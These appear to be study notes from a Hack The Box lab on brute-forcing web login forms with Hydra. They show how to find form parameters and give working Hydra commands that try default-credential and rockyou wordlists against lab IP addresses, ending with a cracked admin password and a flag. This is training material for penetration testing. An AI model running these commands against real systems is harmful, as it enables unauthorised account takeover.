# Hydra Modules

## Brute Forcing Forms

hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e

hydra http-post-form -U
 "/login.php:user=^USER^&pass=^PASS^:incorrect"

## Fail/Success String

"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'"

# Determine Login Parameters

## Using Browser

[CTRL + SHIFT + E]
Copy > Copy POST data
username=test&password=test


## cURL

curl 'http://178.128.40.63:31554/login.php' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://178.128.40.63:31554' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://178.128.40.63:31554/login.php' -H 'Cookie: PHPSESSID=8iafr4t6c3s2nhkaj63df43v05' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'username=test&password=test'

## Using Burp Suite

Set interception

username=admin&password=admin

--> specification in hydra :
"/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

# Login Form Attacks

## Default Credentials

hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

## Password Wordlist

hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

## LAB

http://83.136.250.104:48522/login.php

hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 83.136.250.104 -s 48522 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"


locate rockyou.txt
/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
/usr/share/wordlists/rockyou.txt

hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 83.136.250.104 -s 48522 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

[48522][http-post-form] host: 83.136.250.104   login: admin   password: password1

HTB{bru73_f0rc1n6_15_4_l457_r350r7}
